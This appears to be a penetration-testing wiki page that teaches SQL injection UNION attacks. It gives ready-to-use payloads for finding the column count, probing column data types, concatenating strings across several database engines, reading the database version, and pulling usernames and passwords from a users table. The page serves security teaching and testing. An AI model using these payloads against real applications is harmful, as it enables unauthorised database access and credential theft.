# UNION Attacks

## Theory

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query will return a single result set with two columns, containing values from columns **a** and **b** in **table1** and columns **c** and **d** in **table2**.

## Practice

### Finding number of columns

We first need to know the number of columns in order to append data. When performing a SQL injection UNION attack, there are three effective methods to determine how many columns are being returned from the original query.

{% tabs %}
{% tab title="MySQL" %}
Using `order by`

```sql
1' ORDER BY 1--+	#True
1' ORDER BY 2--+	#True
1' ORDER BY 3--+	#True
1' ORDER BY 4--+	#False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+	True
```

Using `group by`

```sql
1' GROUP BY 1--+	#True
1' GROUP BY 2--+	#True
1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+	True
```

Using `UNION SELECT` This only works if error showing is enabled

```sql
' UNION SELECT NULL--            #The used SELECT statements have a different number of columns
' UNION SELECT NULL,NULL--       #The used SELECT statements have a different number of columns
' UNION SELECT NULL,NULL,NULL--  #No error means query uses 3 column
```
{% endtab %}
{% endtabs %}

###

### Finding the good column's data type

The reason for performing a SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

{% tabs %}
{% tab title="MySQL" %}
After already determined number of columns, you can probe each column to test whether it can hold string data by submitting a series of `UNION SELECT`. For example, if the query returns four columns, you would submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
{% endtab %}
{% endtabs %}

###

### String concatenation

You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values.\
For example, on Oracle you could submit the input: `' UNION SELECT username || '~' || password FROM users--`

{% tabs %}
{% tab title="MySQL" %}
```sql
'foo' '~' 'bar' /*Note the space between the two strings*/
CONCAT('foo','~','bar')
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
'foo'+'~'+'bar' 
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
'foo'||'~'||'bar' 
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
'foo'||'~'||'bar' 
```
{% endtab %}

{% tab title="SQLite" %}
```sql
'foo'||'~'||'bar' 
```
{% endtab %}
{% endtabs %}

###

### Using UNION attack

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

For example we can retrieve the database version on MySQL:

```sql
' UNION SELECT @@version, NULL--
```

You can now use queries on this page, in combinaison with UNION injection to dump the database.

{% content-ref url="enum-database.md" %}
[enum-database.md](enum-database.md)
{% endcontent-ref %}

## Resources

{% embed url="https://portswigger.net/web-security/sql-injection" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}
